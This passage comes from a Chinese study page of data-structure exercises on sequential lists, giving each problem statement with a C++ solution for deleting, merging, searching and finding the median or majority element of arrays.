<h2 id="解题代码-2"><a href="#解题代码-2" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deleteX</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xCnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 记录当前遍历位置之前x的出现次数</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        nums<span class="token punctuation">[</span>i <span class="token operator">-</span> xCnt<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        xCnt <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> x<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> n <span class="token operator">-</span> xCnt<span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除冗余元素</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除特定区间内的元素"><a href="#删除特定区间内的元素" class="headerlink" title="删除特定区间内的元素"></a>删除特定区间内的元素</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>从<strong>有序顺序表</strong>中删除其值在给定值 s 和 t 之间（要求 s &lt; t）的所有元素，若 s 或 t 不合理或者顺序表为空，则显示错误信息并退出运行。</p>
<h2 id="解题代码-3"><a href="#解题代码-3" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">deleteInterval</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">>=</span> t <span class="token operator">||</span> nums<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到首个不小于s的元素</span>
        <span class="token operator">++</span>left<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> t<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找到首个不大于t的元素</span>
        <span class="token operator">--</span>right<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">int</span> length <span class="token operator">=</span> right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span> i <span class="token operator">+</span> length <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i <span class="token operator">+</span> length<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 移动元素</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> n <span class="token operator">-</span> length<span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="删除重复元素"><a href="#删除重复元素" class="headerlink" title="删除重复元素"></a>删除重复元素</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>从<strong>有序顺序表</strong>中删除所有值重复的元素，使表中所有元素的值均不同。</p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deleteRedundancy</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> reCnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">++</span>reCnt<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            nums<span class="token punctuation">[</span>i <span class="token operator">-</span> reCnt<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> n <span class="token operator">-</span> reCnt<span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="合并有序顺序表"><a href="#合并有序顺序表" class="headerlink" title="合并有序顺序表"></a>合并有序顺序表</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>将两个有序顺序表合并称为一个新的有序顺序表，并由函数返回结果顺序表。</p>
<h2 id="解题代码-5"><a href="#解题代码-5" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeList</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n1 <span class="token operator">=</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> n2 <span class="token operator">=</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeNums</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> n2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> p1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> pm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;</span> n1 <span class="token operator">&amp;&amp;</span> p2 <span class="token operator">&lt;</span> n2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums2<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            mergeNums<span class="token punctuation">[</span>pm<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums1<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            mergeNums<span class="token punctuation">[</span>pm<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums2<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;</span> n1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        mergeNums<span class="token punctuation">[</span>pm<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums1<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>p2 <span class="token operator">&lt;</span> n2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        mergeNums<span class="token punctuation">[</span>pm<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums2<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> mergeNums<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="替换线性表位置"><a href="#替换线性表位置" class="headerlink" title="替换线性表位置"></a>替换线性表位置</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知在一维数组 A[m + n] 中依次存放两个线性表（a1, a2, …, am）和（b1, b2, …, bn）。编写一个函数，将数组中两个顺序表的位置互换，即将（b1, b2, …, bn）放在（a1, a2, …, am）的前面。</p>
<h2 id="解题代码-6"><a href="#解题代码-6" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">swapList</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> m <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 整体逆置</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 前n个元素逆置</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">,</span> j <span class="token operator">=</span> m <span class="token operator">+</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 后m个元素逆置</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="查找有序表中的特定值元素"><a href="#查找有序表中的特定值元素" class="headerlink" title="查找有序表中的特定值元素"></a>查找有序表中的特定值元素</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><p>线性表（a1, a2, …, an）中的元素递增有序且按顺序存储在计算机内。要求设计一个算法，完成用最少时间在表中查找值为 x 的元素，若找到，则将其与后继元素位置相交换。若找不到，则将其插入表中并使表中元素仍然递增有序。</p>
<h2 id="解题代码-7"><a href="#解题代码-7" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">searchX</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 二分查找</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">!=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    nums<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 查找失败，插入x</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="查找两个序列的中位数"><a href="#查找两个序列的中位数" class="headerlink" title="查找两个序列的中位数"></a>查找两个序列的中位数</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><p>一个长度为 L（L &gt;= 1） 的升序序列 S，处在第 ⌈L / 2⌉ 个位置的数称为 S 的中位数。例如，若序列 S1 = (11, 13, 15, 17, 19)，则 S1 的中位数是 15，两个序列的中位数是含它们所有元素的升序序列的中位数。例如，若 S2 = (2, 4, 6, 8, 20)，则 S1 和 S2 的中位数为 11。现在有两个等长升序序列 A 和 B，试设计一个在时间和空间两方面都尽可能高效的算法，找出两个序列 A 和 B 的中位数。 </p>
<h2 id="解题代码-8"><a href="#解题代码-8" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">searchMedian</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums1<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> left1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right1 <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> left2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right2 <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>left1 <span class="token operator">&lt;</span> right1 <span class="token operator">&amp;&amp;</span> left2 <span class="token operator">&lt;</span> right2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> mid1 <span class="token operator">=</span> <span class="token punctuation">(</span>left1 <span class="token operator">+</span> right1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> mid2 <span class="token operator">=</span> <span class="token punctuation">(</span>left2 <span class="token operator">+</span> right2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>mid1<span class="token punctuation">]</span> <span class="token operator">==</span> nums2<span class="token punctuation">[</span>mid2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> nums1<span class="token punctuation">[</span>mid1<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>mid1<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums2<span class="token punctuation">[</span>mid2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 判断区间长度的奇偶性以确保 nums1 和 nums2 区间长度相等</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right1 <span class="token operator">-</span> left1<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                left1 <span class="token operator">=</span> mid1<span class="token punctuation">;</span>
                right2 <span class="token operator">=</span> mid2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                left1 <span class="token operator">=</span> mid1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
                right2 <span class="token operator">=</span> mid2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right2 <span class="token operator">-</span> left2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                right1 <span class="token operator">=</span> mid1<span class="token punctuation">;</span>
                left2 <span class="token operator">=</span> mid2<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                right1 <span class="token operator">=</span> mid1<span class="token punctuation">;</span>
                left2 <span class="token operator">=</span> mid2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token function">min</span><span class="token punctuation">(</span>nums1<span class="token punctuation">[</span>left1<span class="token punctuation">]</span><span class="token punctuation">,</span> nums2<span class="token punctuation">[</span>left2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="数组的主元素"><a href="#数组的主元素" class="headerlink" title="数组的主元素"></a>数组的主元素</h1><h2 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知一个整数序列 A = (a0, a1, …, an - 1)，其中 0 &lt;= ai &lt; n（0 &lt;= i &lt; n）。若存在 ap1 = ap2 = … = apm = x 且 m &gt; n / 2（0 &lt;= pk &lt; n, 1 &lt;= k &lt;= m），则称 x 为 A 的主元素。例如 A = (0, 5, 5, 3, 5, 7, 5, 5)，则 5 为主元素；又如 A = (0, 5, 5, 3, 5, 1, 5, 7)。则 A 中没有主元素。假设 A 中的 n 个元素保存在一个一维数组中，请设计一个尽可能高效的算法，找出 A 的主元素。若存在主元素，则输出该元素；否则输出 -1。</p>
<h2 id="解题代码-9"><a href="#解题代码-9" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">getMainElem</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> mainElem <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 找出可能为主元素的元素</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> mainElem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">++</span>cnt<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token operator">--</span>cnt<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            mainElem <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 判断该元素是否为主元素</span>
        cnt <span class="token operator">+=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> mainElem<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> cnt <span class="token operator">></span> n <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">?</span> mainElem <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="未出现的最小正整数"><a href="#未出现的最小正整数" class="headerlink" title="未出现的最小正整数"></a>未出现的最小正整数</h1><h2 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个含 n（n &gt;= 1）个整数的数组，请设计一个在时间上和空间上尽可能高效的算法，找出数组中未出现的最小正整数。例如，数组 {-5, 3, 2, 3} 中未出现的最小正整数为 1；数组 {1, 2, 3} 中未出现的最小正整数为 4。</p>
<h2 id="解题代码-10"><a href="#解题代码-10" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">getMinPositive</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">numSet</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
